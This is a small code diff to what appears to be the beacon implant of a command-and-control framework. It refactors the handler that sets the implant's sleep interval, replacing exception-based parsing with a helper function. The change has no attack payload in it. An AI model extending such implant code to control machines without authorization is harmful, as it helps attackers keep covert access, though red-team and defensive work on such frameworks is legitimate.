@@ -643,12 +643,13 @@ bool Beacon::handleEndInstruction(C2Message&, C2Message& c2RetMessage)
 bool Beacon::handleSleepInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 {
     std::string newSleepTimer = c2Message.cmd();
-    try
+    float sleepSeconds = 0.0f;
+    if (parseSleepSeconds(newSleepTimer, sleepSeconds))
     {
-        m_aliveTimerMs = std::stof(newSleepTimer) * 1000;
+        m_aliveTimerMs = static_cast<int>(sleepSeconds * 1000);
         newSleepTimer = std::to_string(m_aliveTimerMs) + "ms";
     }
-    catch (const std::invalid_argument&)
+    else
     {
         newSleepTimer = CmdStatusFail;
     }
